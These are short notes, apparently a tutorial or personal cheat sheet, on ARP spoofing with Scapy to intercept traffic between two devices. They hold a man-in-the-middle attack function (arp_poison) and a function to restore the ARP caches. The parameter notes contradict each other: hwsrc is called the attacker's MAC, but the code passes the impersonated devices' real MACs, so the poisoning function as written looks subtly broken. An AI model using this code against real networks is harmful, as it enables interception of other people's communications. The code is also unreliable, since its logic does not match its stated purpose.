target_ip: The IP address of the device you want to intercept communication from.
target_mac: The MAC address of the device you want to intercept communication from.
source_ip: The IP address of the device you want to impersonate to the target.
source_mac: The MAC address of the device you want to impersonate to the target.

##  ARP poison
ARP: A Scapy class for creating ARP packets. op=2 specifies an ARP reply.
pdst: Destination IP address.
hwdst: Destination MAC address.
psrc: Source IP address (spoofed).
hwsrc: Source MAC address (attacker's MAC).

```
def arp_poison(target_ip, target_mac, source_ip, source_mac):
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac), verbose=False)
    send(ARP(op=2, pdst=source_ip, hwdst=source_mac, psrc=target_ip, hwsrc=target_mac), verbose=False)
```

## restore poison

```
def restore_arp(target_ip, target_mac, source_ip, source_mac):
    send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=source_mac, psrc=source_ip), count=3, verbose=False)
    send(ARP(op=2, pdst=source_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac, psrc=target_ip), count=3, verbose=False)
```

ff:ff:ff:ff:ff:ff --> adress brodcast